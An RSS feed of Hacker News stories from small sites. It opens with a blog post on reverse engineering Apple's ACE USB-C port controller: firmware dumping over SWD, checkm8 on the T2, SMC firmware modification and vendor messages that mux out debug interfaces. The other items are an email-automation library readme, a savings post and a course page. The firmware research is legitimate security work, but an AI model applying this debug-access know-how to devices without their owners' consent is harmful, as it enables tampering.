<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>
<![CDATA[Hacker News - Small Sites - Score >= 10]]>
        </title>
        <description>
<![CDATA[Hacker News stories from domains that aren't in the top 1M and that have a score of at least 10. Updated nightly via https://github.com/awendland/hacker-news-small-sites]]>
        </description>
        <link>https://news.ycombinator.com</link>
        <generator>RSS for Node</generator>
        <lastBuildDate>Fri, 01 Jan 2021 04:52:41 GMT</lastBuildDate>
        <atom:link href="https://raw.githubusercontent.com/awendland/hacker-news-small-sites/generated/feeds/hn-small-sites-score-10.xml" rel="self" type="application/rss+xml"></atom:link>
        <pubDate>Fri, 01 Jan 2021 04:52:41 GMT</pubDate>
        <language>
<![CDATA[en-US]]>
        </language>
        <managingEditor>
<![CDATA[me@alexwendland.com (Alex Wendland)]]>
        </managingEditor>
        <ttl>240</ttl>
        <item>
            <title>
<![CDATA[ACE: Apple Type-C Port Controller Secrets]]>
            </title>
            <description>
<![CDATA[
Score 105 | Comments 11 (<a href="https://news.ycombinator.com/item?id=25579286">thread link</a>) | @aunali1
<br/>
December 29, 2020 | https://blog.t8012.dev/ace-part-1/ | <a href="https://web.archive.org/web/*/https://blog.t8012.dev/ace-part-1/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
<div>
<article>

<figure>
<img srcset="https://blog.t8012.dev/content/images/size/w300/2020/12/s-l400.jpg 300w,
                            https://blog.t8012.dev/content/images/size/w600/2020/12/s-l400.jpg 600w,
                            https://blog.t8012.dev/content/images/size/w1000/2020/12/s-l400.jpg 1000w,
                            https://blog.t8012.dev/content/images/size/w2000/2020/12/s-l400.jpg 2000w" sizes="(max-width: 800px) 400px,
                        (max-width: 1170px) 1170px,
                            2000px" src="https://blog.t8012.dev/content/images/size/w2000/2020/12/s-l400.jpg" alt="ACE: Apple Type-C Port Controller Secrets | Part 1">
</figure>
<section>
<div>
<h2 id="introduction">Introduction</h2><p>After our team successfully <a href="https://www.theiphonewiki.com/wiki/T8012#Bootrom_Exploits">ported</a> the <a href="https://www.theiphonewiki.com/wiki/Checkm8_Exploit">checkm8</a> exploit to the AppleSilicon T2 chip, we began exploring methods for closed-case hardware debugging, or CCD, as found on other iDevices. On such devices, the <a href="https://developer.arm.com/architectures/cpu-architecture/debug-visibility-and-trace/coresight-architecture/serial-wire-debug">Serial Wire Debug</a> protocol can be muxed out across the Lightning connector, which we presumed was replicable across the USB Type-C connector. With some assistance from easily obtainable schematics for our MacBook models, we have determined that muxing is handled by an Apple/TI co-designed <a href="https://www.usb.org/document-library/usb-type-cr-port-controller-interface-specification">USB Type-C Port Controller</a>, colloquially known as "ACE". The following details our findings and the vendor defined protocol, termed AppleVDM, Apple has implemented over the USB Power Delivery standard for muxing out various internal peripherals.</p><p>A member of our team, @h0m3us3r has dumped the ACE firmware by attaching a SWD probe onto exposed test points on the logic board of a MacBook Pro. Thanks to this we were able to obtain both the ROM and the firmware payload patch applied over it and discover that the ACE chip contains a <code><a href="https://developer.arm.com/ip-products/processors/cortex-m/cortex-m0">Cortex-M0 r0p1</a></code> ARM core. Most of the static analysis was later conducted by @mrarm.</p><pre><code>Connecting to target via SWD
Found SW-DP with ID 0x0BC11477
DPIDR: 0x0BC11477
Scanning AP map to find all available APs
AP[1]: Stopped AP scan as end of AP map has been reached
AP[0]: AHB-AP (IDR: 0x04770031)
Iterating through AP map to find AHB-AP to use
AP[0]: Core found
AP[0]: AHB-AP ROM base: 0xE00FF000
CPUID register: 0x410CC601. Implementer code: 0x41 (ARM)
Found Cortex-M0 r0p1, Little endian.
FPUnit: 4 code (BP) slots and 0 literal slots
CoreSight components:
ROMTbl[0] @ E00FF000
ROMTbl[0][0]: E000E000, CID: B105E00D, PID: 000BB008 SCS
ROMTbl[0][1]: E0001000, CID: B105E00D, PID: 000BB00A DWT
ROMTbl[0][2]: E0002000, CID: B105E00D, PID: 000BB00B FPB
Cortex-M0 identified.
</code></pre>
<center>Segger J-Link Probe output when attached to ACE2 (CD3217).</center><h2 id="ace-overview">ACE Overview</h2><p>To better understand the inner-workings of ACE, we began looking for identifying information within the dumped firmware. We found the string <code>CD3217 &nbsp; HW0022 FW002.032.00 ZACE2-J213</code> and upon searching <code>CD3217</code> online resulted in the similar <a href="https://www.ti.com/lit/ds/symlink/tps65986.pdf">TI TPS65986</a>. Based on how similar the functional description of the aforementioned TI USB Type-C Controller is to ACE, and considering that TI co-designed ACE with Apple, it was reasonable to assume most of the technical information applies to ACE.</p><p>TI's USB Type-C Controllers expose an I²C interface for host management, for which we found the excellent <a href="https://www.ti.com/lit/ug/slvuan1a/slvuan1a.pdf">Host Interface Technical Reference Manual</a>, documenting a multitude of public I²C registers and commands.</p><figure><img src="https://blog.t8012.dev/content/images/2020/12/image.png" alt="" srcset="https://blog.t8012.dev/content/images/size/w600/2020/12/image.png 600w, https://blog.t8012.dev/content/images/size/w1000/2020/12/image.png 1000w, https://blog.t8012.dev/content/images/2020/12/image.png 1330w" sizes="(min-width: 720px) 720px"><figcaption>TPS65986 Functional Block Diagram</figcaption></figure><p>The primary component of focus based on the above block diagram is the digital core, which communicates directly with the host and runs the firmware we dumped previously. As mentioned, the core is based on a <code>Cortex-M0 r0p1</code>. Unfortunately, we were unable to create a complete memory map with peripherals as TI does not release public information on the core itself. Regardless, we have the basic memory layout as follows:</p><p>Since we weren't sure whether the code for muxing out things lives in the ACE or somewhere else (there are registers for receiving vendor messages and processing them on another chip), we also investigated the firmware of chips that can directly communicate with the ACE, the SMC, part of T2 SoC, and the Thunderbolt controller. While we obtained and analyzed the I2C usages in the SMC firmware and found no suspicious code whatsoever, we had issues with analyzing the Thunderbolt controller firmware and decided to only reverse engineer it as a last resort. We initially thought that the only way that we could talk with the ACE from Mac OS (Intel) was by modifying the SMC firmware to relay commands to the ACE. While we have successfully managed to edit the SMC firmware and talk with the ACE, it turned out that this effort wasn't needed. Later we stumbled upon the following project: <a href="https://github.com/osy/ThunderboltPatcher">https://github.com/osy/ThunderboltPatcher</a>, which uses the AppleHPM kext in order to communicate with the ACE.</p><p>The AppleHPM KEXT allows a user space program running as root to read and write ACE registers. It also has several interesting methods that seem to be intended for reading and writing registers on ACEs connected using a USB Type-C cable to the DUT. Unfortunately, while we tried invoking them, we didn't manage to get these methods working, suggesting that either they have been disabled on production hardware or need some more preparation work in order to work. We also discovered that there exists an EFI mode firmware updater for the ACE called <code>HPMUtil.efi</code>, which we also partially reverse engineered. There seems to be several methods of updating the ACEs depending on the hardware revision; the EFI program also seems to have an argument that makes it update externally connected ACEs, however at least for recent ACEs it seems to be broken; the only update route that would work on the firmware dump we obtained from our Mac (based on available commands) seems to be hardcoded in a few places to run commands on the local ACE.</p><p>There are at least 3 known revisions of the ACE chip. Based on hardware available to us, the first variant, ACE1, is known to be used in 2018 and older T2 models, the second, ACE2, in 2019 and newer T2 models, and the third in 2020 M1 enabled laptops. The software update method differs significantly between ACE1 and ACE2. At the time of writing the article, we have only successfully dumped a single ACE firmware (ACE2) and all the analysis here is based on that version.</p><h2 id="usb-pd">USB PD</h2><p>The logical channel for telling the Mac to mux out something other than USB from the chip would be USB PD, since ACE's main communication vector with external devices is USB PD and because controlling data lines using USB PD is a widespread practice (see: MIPI debug interface as well as this article on getting UART off an Samsung phone: <a href="https://ntnuopen.ntnu.no/ntnu-xmlui/bitstream/handle/11250/2632162/bookchapter.pdf">https://ntnuopen.ntnu.no/ntnu-xmlui/bitstream/handle/11250/2632162/bookchapter.pdf</a>). This TI-derived controller can be configured to support some variant of MIPI debug mode by default (and the MIPI debug ID is present in the Apple ACE firmware as well), however as we discovered later it is disabled in Apple's configuration and can not be used. As such, we decided to look for other Vendor Defined Messages that the ACE understands.</p><p>In the USB PD protocol, entering a vendor mode begins by sending a SVID (Standard ID or Vendor ID, usually the vendor's USB VID) and object position (think of it as a sub mode that the vendor can define). By analyzing the ACE firmware we found at least 3 possible object positions under the Apple SVID, however their availability is dynamic and by default only a single SVID and object position is available. This primary mode is, for example, used when the Apple's charger is connected. We are not sure when the other modes are activated and plan to do further work related to figuring out what the purpose of these other modes is.</p><p>Since it would be logical if there was a reply for the command for entering a mode and also because reverse engineering an embedded firmware with no context whatsoever is hard, we decided to look into the <code>VDMs</code> command, which can be used to send a VDM PD message. This allowed us to gather important information about the firmware's inner workings and also to find a few functions that sent a message with Apple's vendor ID. We investigated several of these, some of them were indeed related to the protocol used with the charger (which we aren't sure what the purpose of is; however from what it seems it can be only used to read some memory sections from the external device), but we also found another procedure that had three cases, two of which replied with 16-bit values (created from information from a particular memory area) in a similar way to the Discover SVIDs VDM, and one of them was complex and handled additional logic. We investigated it further and eventually managed to use it to mux things out of the controller.</p><p>Another possible use of the <code>VDMs</code> command can be found in the AppleHPM KEXT and the <code>HPLUtil.efi</code> program, which is reading registers from externally connected devices. Since we haven't given much attention to it as it was not our goal and our experiments were a failure, we are not going to describe it in this article.</p><p>Note that since SWD can also be muxed from the ACE, further reverse engineering ACE modes is not that interesting; you should be able to use the ACE's SWD to trigger any mux choice of your choosing and directly talk to all peripherals ACE has access to.</p><h2 id="dive-into-the-code">Dive into the code</h2><p>With @h0m3us3r's dump of ROM and RAM memory, we started by loading the ACE firmware in IDA. The reset handler address is present at <code>0x00000004</code> and can be used to get the address of the entrypoint.</p><p>The command table can be trivially found by looking for the 4 character codes. Register table requires a bit more effort but is also not hard to find (since there is a register that is a string, you can find what references it). In comparison to the public TI documentation, there are substantially more commands and registers available, some of which are Apple-specific additions. Since the firmware has barely any strings or debug information, the command list has been very helpful.</p><p>After initially exploring the firmware we quickly stumbled upon cursed looking trampolines such as the following:</p><pre><code>ROM:000266C2 _Command_HRST                           ; DATA XREF: ROM:commandsâ†“o
ROM:000266C2
ROM:000266C2
ROM:000266C2                 PUSH            {R4-R6,LR}
ROM:000266C4                 MOV             R4, R1
ROM:000266C6                 MOV             R5, R0
ROM:000266C8                 BL              sub_E4
ROM:000266CC                 LDR             R0, =dword_20041040
ROM:000266CE                 MOV             R1, R4
ROM:000266D0                 ADDS            R0, #0x40 ; '@'
ROM:000266D2                 LDR             R2, [R0]
ROM:000266D4                 MOV             R0, R5
ROM:000266D6                …</code></pre></div></section></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.t8012.dev/ace-part-1/">https://blog.t8012.dev/ace-part-1/</a></em></p>]]>
            </description>
            <link>https://blog.t8012.dev/ace-part-1/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25579286</guid>
            <pubDate>Wed, 30 Dec 2020 06:49:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Candymail – Email Automation for Node.js]]>
            </title>
            <description>
<![CDATA[
Score 37 | Comments 12 (<a href="https://news.ycombinator.com/item?id=25578834">thread link</a>) | @sssaini
<br/>
December 29, 2020 | https://saasbase.dev/candymail | <a href="https://web.archive.org/web/*/https://saasbase.dev/candymail">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><article id="block-candymail"><p><span><span>CandyMail makes it easy to trigger and send multi-step email sequences in Node.js using a single JSON file. Built for bootstrappers, indie makers with special care.</span></span></p><div id="block-a7a22de82c9f4f61a9581a647e597231"><div><p><img alt="image" src="https://saasbase.dev/_next/image?url=https%3A%2F%2Fapi.super.so%2Fasset%2Fsaasbase.dev%2F638675a6-a551-47cc-b24f-892b2cff969e.png&amp;w=1080&amp;q=100" srcset="https://saasbase.dev/_next/image?url=https%3A%2F%2Fapi.super.so%2Fasset%2Fsaasbase.dev%2F638675a6-a551-47cc-b24f-892b2cff969e.png&amp;w=640&amp;q=100 1x, https://saasbase.dev/_next/image?url=https%3A%2F%2Fapi.super.so%2Fasset%2Fsaasbase.dev%2F638675a6-a551-47cc-b24f-892b2cff969e.png&amp;w=1080&amp;q=100 2x" decoding="async"></p></div></div><h2 id="block-f23dcaeb10b744778d2080a9d073d409"><span id="f23dcaeb10b744778d2080a9d073d409"></span><span><span><strong>Features</strong></span></span></h2><ol><li id="block-45aa8049a4cf4dfa90441e2d4a931dc9"><span><span><strong>Portable</strong></span><span>: Create, share and reuse email marketing strategies between different products</span></span></li><li id="block-04009c38a7d743eb85e3206079018bf7"><span><span><strong>Simple to use</strong></span><span>: Time to send, subject, body of the emails can all be set up in a single JSON file</span></span></li><li id="block-a64766efe6574cc9b4c72db02135e034"><span><span><strong>Free</strong></span><span>: No need to pay for monthly Mailchimp etc. payments for email automation plans</span></span></li></ol><h2 id="block-5ab828b20084466c9a9655231ea704e7"><span id="5ab828b20084466c9a9655231ea704e7"></span><span><span><strong>Use Cases</strong></span></span></h2><ul><li id="block-c44e7c12446340988c153bfdfe2d4487"><span><span>Build better onboarding by guiding the user through the app with paced training emails</span></span></li><li id="block-04216dfc690441ccbc29f2c49eb56297"><span><span>Reduce churn by sending exciting community content every few days</span></span></li><li id="block-20f9940a1ef542958ad8c5faa7b5be4c"><span><span>Convert more customers to paid plans by offering discounts based on the user's usage activity</span></span></li></ul><h2 id="block-ebb2664d7aff451b83ee65168e44bbc8"><span id="ebb2664d7aff451b83ee65168e44bbc8"></span><span><span><strong>Installation</strong></span></span></h2><p><span><span>Install candymail using yarn:</span></span></p><p><span><span>Or npm:</span></span></p><div id="block-3b1e9c2a5b5442d99676426c2499d03f"><pre><code><span>npm install --save candymail</span></code></pre><figcaption><span></span></figcaption></div><h2 id="block-dafd20b6db8f4fa495bcc253547865b6"><span id="dafd20b6db8f4fa495bcc253547865b6"></span><span><span><strong>Getting Started</strong></span></span></h2><h3 id="block-427f998161b748f498f9b6cbc5ced03a"><span id="427f998161b748f498f9b6cbc5ced03a"></span><span><span><strong>Configuration</strong></span></span></h3><p><span><span>Create a&nbsp;</span><span><code>candymail.automation.json</code></span><span>&nbsp;file on the root level of your project.</span></span></p><p><span><span>Here's a sample:</span></span></p><div id="block-e0c98a5f7c5241d4bbe3eb12f1e5696c"><pre><code><span>{</span><span>
</span><span>  </span><span>"automations"</span><span>:</span><span> </span><span>[</span><span>
</span><span>    </span><span>{</span><span>
</span><span>      </span><span>"name"</span><span>:</span><span> </span><span>"automation1"</span><span>,</span><span>
</span><span>      </span><span>"description"</span><span>:</span><span> </span><span>"tell users about pro features"</span><span>,</span><span>
</span><span>      </span><span>"trigger_name"</span><span>:</span><span> </span><span>"proplan"</span><span>,</span><span>
</span><span>      </span><span>"emails"</span><span>:</span><span> </span><span>[</span><span>
</span><span>        </span><span>{</span><span>
</span><span>          </span><span>"trigger"</span><span>:</span><span> </span><span>"time"</span><span>,</span><span>
</span><span>          </span><span>"sendDelay"</span><span>:</span><span> </span><span>1</span><span>,</span><span>
</span><span>          </span><span>"subject"</span><span>:</span><span> </span><span>"Have you tried Feature A?"</span><span>,</span><span>
</span><span>          </span><span>"body"</span><span>:</span><span> </span><span>"Feature A will let you do ABC things. Check it out!"</span><span>,</span><span>
</span><span>          </span><span>"from"</span><span>:</span><span> </span><span>"abc@gmail.com"</span><span>
</span><span>        </span><span>}</span><span>,</span><span>
</span><span>        </span><span>{</span><span>
</span><span>          </span><span>"trigger"</span><span>:</span><span> </span><span>"time"</span><span>,</span><span>
</span><span>          </span><span>"sendDelay"</span><span>:</span><span> </span><span>3</span><span>,</span><span>
</span><span>          </span><span>"subject"</span><span>:</span><span> </span><span>"Try our feature B!"</span><span>,</span><span>
</span><span>          </span><span>"body"</span><span>:</span><span> </span><span>"We released feature B just last week and can't wait for you to try it out :)"</span><span>,</span><span>
</span><span>          </span><span>"from"</span><span>:</span><span> </span><span>"abc@gmail.com"</span><span>
</span><span>        </span><span>}</span><span>
</span><span>      </span><span>]</span><span>
</span><span>    </span><span>}</span><span>
</span><span>  </span><span>]</span><span>
</span><span></span><span>}</span><span>
</span>
</code></pre><figcaption><span></span></figcaption></div><h3 id="block-4016925d0984430085d1ad2a72663cce"><span id="4016925d0984430085d1ad2a72663cce"></span><span><span><strong>Supported Email Providers</strong></span></span></h3><ul><li id="block-d88924222cb4409b9a8d37f5c3a28ed0"><span><span>Gmail</span></span></li><li id="block-1df81b4e29f54e25944ccc0e93ef641d"><span><span>Looking for more support? Send me a message.</span></span></li></ul><h3 id="block-82f3fafe4e084cb7af5c77bca9444d1d"><span id="82f3fafe4e084cb7af5c77bca9444d1d"></span><span><span><strong>Usage</strong></span></span></h3><div id="block-8d7360b2d2d045448baf1ed1063f3e13"><pre><code><span>const</span><span> path </span><span>=</span><span> </span><span>require</span><span>(</span><span>'path'</span><span>)</span><span>
</span><span></span><span>const</span><span> candymail </span><span>=</span><span> </span><span>require</span><span>(</span><span>'candymail'</span><span>)</span><span>
</span>
<span></span><span>const</span><span> automationPath </span><span>=</span><span> path</span><span>.</span><span>resolve</span><span>(</span><span>'candymail.automation.json'</span><span>)</span><span>
</span>
<span>candymail</span><span>.</span><span>init</span><span>(</span><span>automationPath</span><span>,</span><span> </span><span>{</span><span>
</span><span>  senderEmail</span><span>:</span><span> </span><span>**</span><span>GMAILEMAIL</span><span>**</span><span>,</span><span>
</span><span>  senderPassword</span><span>:</span><span> </span><span>**</span><span>GMAILPASSWORD</span><span>**</span><span>
</span><span></span><span>}</span><span>)</span><span>
</span>
<span>candymail</span><span>.</span><span>start</span><span>(</span><span>)</span><span>
</span>
<span></span><span>const</span><span> user </span><span>=</span><span> </span><span>'howivey729@chatdays.com'</span><span>
</span><span>candymail</span><span>.</span><span>runAutomation</span><span>(</span><span>'automation1'</span><span>,</span><span> user</span><span>)</span><span>
</span>
<span></span><span>console</span><span>.</span><span>log</span><span>(</span><span>'Emails added to queue'</span><span>,</span><span> candymail</span><span>.</span><span>getAllScheduledMessages</span><span>(</span><span>)</span><span>)</span><span>
</span>
</code></pre><figcaption><span></span></figcaption></div><p><span><span>Note: Having problems with Gmail? Enable&nbsp;</span><span><code>Allow less secure apps</code></span><span>&nbsp;in Google Account settings&nbsp;</span><span><a href="https://myaccount.google.com/lesssecureapps" target="_blank" rel="noopener noreferrer">here</a></span><span>.</span></span></p><h2 id="block-8905c8f6ec90428290f752898c389144"><span id="8905c8f6ec90428290f752898c389144"></span><span><span><strong>Automation File Options</strong></span></span></h2><div id="block-92d9833cf5bd44c895eee0027a1111fc"><div><table><thead><tr><th>Property</th><th>Required</th><th>Description</th></tr></thead><tbody><tr><td><p><span><span>trigger</span></span></p></td><td></td><td><p><span><span>Name of the trigger (Not usable)</span></span></p></td></tr><tr><td><p><span><span>sendDelay</span></span></p></td><td><div></div></td><td><p><span><span>Delay after which the email will be sent (in hours). From time 0, not from the last email</span></span></p></td></tr><tr><td><p><span><span>subject</span></span></p></td><td><div></div></td><td><p><span><span>Subject of the email</span></span></p></td></tr><tr><td><p><span><span>body</span></span></p></td><td><div></div></td><td><p><span><span>Body of the email</span></span></p></td></tr><tr><td><p><span><span>from</span></span></p></td><td><div></div></td><td><p><span><span>Sender's Email Address</span></span></p></td></tr></tbody></table></div></div><h2 id="block-9aac3da583924daf892d731f0ae707ed"><span id="9aac3da583924daf892d731f0ae707ed"></span><span><span><strong>Methods</strong></span></span></h2><h3 id="block-aa32ddc39a3949d99452397186c7f687"><span id="aa32ddc39a3949d99452397186c7f687"></span><span><span><strong>init (automationPath, config)</strong></span></span></h3><p><span><span>Initializes automations specified in the automation path and sets the configuration with sender's email and password.</span></span></p><ul><li id="block-1394bdb55dd148f9a9f5e08a65240a86"><span><span><strong>automationPath</strong></span><span>: Absolute path to the candymail.automation.json file. Example:&nbsp;</span><span><code>path.resolve('example', 'candymail.automation.json')</code></span><span>&nbsp;if the file is located at&nbsp;</span><span><code>ROOT*/example/candymail.automation.json</code></span><span>.</span></span></li><li id="block-35edceb8c19b427fa7f45d1de635de7a"><span><span><strong>config</strong></span><span>:&nbsp;</span><span><code>{ senderEmail -&gt; Gmail Address of the sender, senderPassword -&gt; Gmail Password of the sender }</code></span></span></li></ul><h3 id="block-86ce155fe82047cbaed3aab4820b7c4b"><span id="86ce155fe82047cbaed3aab4820b7c4b"></span><span><span><strong>start()</strong></span></span></h3><p><span><span>Starts the internal timer that will send emails at appropriate times.</span></span></p><h3 id="block-ca0e460e1f5a4dc28c00e2234cbcbfce"><span id="ca0e460e1f5a4dc28c00e2234cbcbfce"></span><span><span><strong>runAutomation(automationName)</strong></span></span></h3><p><span><span>Triggers an automation based on&nbsp;</span><span><code>name</code></span><span>&nbsp;specified in the&nbsp;</span><span><code>candymail.automation.json</code></span><span>&nbsp;file. Needs&nbsp;</span><span><code>candymail.start()</code></span><span>&nbsp;to have been called.</span></span></p><ul><li id="block-9d31ffa059614958b3e26dab0fa275ae"><span><span><strong>automationName</strong></span><span>: Name of&nbsp;</span><span><code>automation</code></span><span>&nbsp;in&nbsp;</span><span><code>candymail.automation.json</code></span><span>. Example: 'automation1'.</span></span></li></ul><h3 id="block-08de5de186f546e6b619a4028cd9b4d1"><span id="08de5de186f546e6b619a4028cd9b4d1"></span><span><span><strong>getAllScheduledMessages()</strong></span></span></h3><p><span><span>Get the list of all scheduled messages.</span></span></p><h3 id="block-7bfc9eff28bc4cbe8a2ae79733484e90"><span id="7bfc9eff28bc4cbe8a2ae79733484e90"></span><span><span><strong>getScheduledMessagesAtTime(time)</strong></span></span></h3><p><span><span>Get the list of scheduled messages for a particular&nbsp;</span><span><code>time</code></span><span>.</span></span></p><ul><li id="block-4544cfeaf80c42e491a6400962124475"><span><span><strong>time</strong></span><span>: Time should be specified in this format:&nbsp;</span><span><code>MM/DD/YYYY:HH</code></span><span>. For Example:&nbsp;</span><span><code>8/20/2020:2</code></span><span>.</span></span></li></ul><h3 id="block-a3786a62f496404c9660f76ba08033ed"><span id="a3786a62f496404c9660f76ba08033ed"></span><span><span><strong>clearAllScheduledMessages()</strong></span></span></h3><p><span><span>Clears all scheduled messages.</span></span></p><h3 id="block-7de077481f3147fea4dba9619476641f"><span id="7de077481f3147fea4dba9619476641f"></span><span><span><strong>stop()</strong></span></span></h3><p><span><span>Stops the internal timer. Can be restarted with&nbsp;</span><span><code>candymail.start()</code></span></span></p><h3 id="block-5d10311284a546dc80c3e57eb45c3392"><span id="5d10311284a546dc80c3e57eb45c3392"></span><span><span><strong>destroy()</strong></span></span></h3><p><span><span>Destroys the internal timer.</span></span></p><h2 id="block-1a98b5e65f4a41e28e4965b5d3d7de9b"><span id="1a98b5e65f4a41e28e4965b5d3d7de9b"></span><span><span><strong>Notes</strong></span></span></h2><ol><li id="block-6bdaea5d6e764e5da158efec480f2add"><span><span>Only the hour value will be used in the cron, minutes will be ignored. +1 hour at 11:58 is 12.</span></span></li><li id="block-d3354e8bdee045c69e7bb24dbd1bebec"><span><span>Object keys:&nbsp;</span><span><code>MM/DD/YYYY:HH</code></span><span>. Hours are specified in 24-hour format.</span></span></li><li id="block-ce94d7c86c894d17ab928f86fa776aef"><span><span>There is currently no&nbsp;</span><span><code>Unsubscribe</code></span><span>&nbsp;option in the emails. Being worked on right now.</span></span></li><li id="block-129c9e22b7c84f48bbcc4d3f284ea196"><span><span>Only supports GMail. More providers being added right now.</span></span></li></ol><div id="block-a05319bc3972418aa5f409ef65943cd3"><p><span><span>Got Feeback? Hit me up at&nbsp;</span><span><a href="mailto:sunnyashiin@gmail.com" target="_blank" rel="noopener noreferrer">sunnyashiin@gmail.com</a></span><span>&nbsp;Now available for freelance work.</span></span></p></div></article></div></div></div>]]>
            </description>
            <link>https://saasbase.dev/candymail</link>
            <guid isPermaLink="false">hacker-news-small-sites-25578834</guid>
            <pubDate>Wed, 30 Dec 2020 05:18:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Lifestyle Inflation. It's a wealth killer]]>
            </title>
            <description>
<![CDATA[
Score 12 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25577821">thread link</a>) | @wackintosh
<br/>
December 29, 2020 | https://www.thriftythoughts.io/lifestyle-inflation/ | <a href="https://web.archive.org/web/*/https://www.thriftythoughts.io/lifestyle-inflation/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            
<div>
    <main>
            <article>
    
    <div>
                <h2 id="it-s-a-wealth-killer-">It's a wealth killer.</h2><p>More expensive cars, clothes, food, homes. The more money we make the more we allow ourselves to splurge. But how much does this cost in the long run?</p><figure><img src="https://www.thriftythoughts.io/content/images/2020/12/UNCLAIMED-PROPERTY--21-.png" alt="" srcset="https://www.thriftythoughts.io/content/images/size/w600/2020/12/UNCLAIMED-PROPERTY--21-.png 600w, https://www.thriftythoughts.io/content/images/2020/12/UNCLAIMED-PROPERTY--21-.png 800w" sizes="(min-width: 720px) 720px"></figure><h2 id="the-cost-of-your-rising-expenses">The cost of your rising expenses</h2><p>Let's assume you have a salary of $50,000 per year starting at age 25 and every year you are able to obtain a 5% raise. In Scenario A as you make more money you allow your expenses to increase by 4% per year. In Scenario B as you make more money you allow your expenses to increase by only 1% per year. By allowing your costs to inflate by 3% less, the result is you end up with $1.5M additional in the bank by age 65 (and this is assuming you aren't investing any of these savings over the years).</p><!--kg-card-begin: html--><!--kg-card-end: html-->
                            <section>
                                <h2>Enjoying these posts? Subscribe for more</h2>
                                
                                <br>
                                
                            </section>
    </div>
        
</article>                    
                </main>
</div>
        </div></div>]]>
            </description>
            <link>https://www.thriftythoughts.io/lifestyle-inflation/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25577821</guid>
            <pubDate>Wed, 30 Dec 2020 02:45:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Learn 3D Computer Graphics Programming from Scratch]]>
            </title>
            <description>
<![CDATA[
Score 106 | Comments 39 (<a href="https://news.ycombinator.com/item?id=25576462">thread link</a>) | @myth_drannon
<br/>
December 29, 2020 | https://courses.pikuma.com/courses/learn-computer-graphics-programming | <a href="https://web.archive.org/web/*/https://courses.pikuma.com/courses/learn-computer-graphics-programming">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main-content" role="main">
  <a id="cst-v2-section-4ed91abbde"></a>

<section data-preview-item="banner-course" data-section-uid="4ed91abbde">
  
</section>




<a id="cst-v2-section-HycmTyvOE"></a><section data-preview-item="checklist" data-section-uid="HycmTyvOE">
  <div>
    <div>
      
  <header>
    
      <h3>This course includes</h3>
    
    
  </header>


      
        <article>
          <ul>
            
              <li>
                <p><i></i>30 hours of on-demand video</p>
              </li>
            
              <li>
                <p><i></i>Downloadable resources and exercises</p>
              </li>
            
              <li>
                <p><i></i>Full lifetime access</p>
              </li>
            
              <li>
                <p><i></i>Access on mobile and desktop</p>
              </li>
            
              <li>
                <p><i></i>14-day money back guarantee</p>
              </li>
            
              <li>
                <p><i></i>Secure checkout through PayPal or Stripe</p>
              </li>
            
          </ul>
        </article>
        
    </div>
  </div>
</section>




<a id="cst-v2-section-BJzA6XSdN"></a><section data-preview-item="video" data-section-uid="BJzA6XSdN">
  
</section>

  





<a id="cst-v2-section-ryenGXDBH"></a><section data-preview-item="checklist" data-section-uid="ryenGXDBH">
  <div>
    <div>
      
  <header>
    
      <h3>Prerequisites</h3>
    
    
      <h4> Before taking this course, you must have:</h4>
    
  </header>


      
        <article>
          <ul>
            
              <li>
                <p><i></i>A basic understanding of programming fundamentals, such as variables, conditionals, loops, and functions.</p>
              </li>
            
              <li>
                <p><i></i>An idea of what a C-style programming language looks like (for example: C++, Java, C#, JavaScript, or Swift).</p>
              </li>
            
              <li>
                <p><i></i>Some experience with the command-line on either Linux, Windows, or macOS.</p>
              </li>
            
          </ul>
        </article>
        
    </div>
  </div>
</section>




<a id="cst-v2-section-HJ495RX_E"></a><section data-preview-item="text-image" data-section-uid="HJ495RX_E">
  <div>
    <article>
      <section>
        
  <header>
    
      <h3>Is this course for you?</h3>
    
    
  </header>


        <p>
          Did you ever wonder how 3D engines render objects on the screen? Or how graphics APIs such as OpenGL or DirectX are written? This course is a complete immersion on how CPU-based 3D engines work. We will use C to develop a complete 3D engine from scratch, pixel by pixel, triangle per triangle. This is a basic course that requires no prior knowledge, but you will probably make the most of it if you know already the basics of programming.
        </p>
        
          <section>
            <a href="https://courses.pikuma.com/cart/add_product/713851?price_id=758247">Buy $19.99</a>
          </section>
        
      </section>
      
        <section>
          <img src="https://s3.amazonaws.com/thinkific-import/167815/RLXbjGyOQNSYemAckI7t_cube.gif" alt="Is this course for you?" title="Is this course for you?">
        </section>
      
    </article>
  </div>
</section>




<a id="cst-v2-section-BJLXI7uSr"></a><section data-preview-item="text-image" data-section-uid="BJLXI7uSr">
  <div>
    <article>
      <section>
        
  <header>
    
      <h3>What you'll learn</h3>
    
    
      <h4>Course overview and structure</h4>
    
  </header>


        <p>
          This course is a complete journey into the world of 3D rendering. We will learn how to represent and display 3D objects without any graphics API. No OpenGL. No DirectX. No GPU. Just you, your C compiler, a smoking processor, and an array of pixel colors willing to dance 90's style. You will learn how to draw pixels, rasterize lines, triangles, complex 3D models, and understand the theory and the math behind computer graphics programming. If you want to understand how computer graphics really work, join us now!
        </p>
        
          <section>
            <a href="https://courses.pikuma.com/cart/add_product/713851?price_id=758247">Buy $19.99</a>
          </section>
        
      </section>
      
        <section>
          <img src="https://s3.amazonaws.com/thinkific-import/167815/Yyy0bZO3QMKfL54nGwlE_f22.gif" alt="What you'll learn" title="What you'll learn">
        </section>
      
    </article>
  </div>
</section>




<a id="cst-v2-section-SkVHSmBO4"></a><section data-preview-item="text-icon" data-section-uid="SkVHSmBO4">
  <div>
    

    <article>
      
        <div>
          <ul>
            
              <li>
                <i></i>
                <h4>Lifetime access</h4>
                <p>Enroll now and get lifetime access to the course content</p>
              </li>
            
              <li>
                
                <h4>Access to discussion forum</h4>
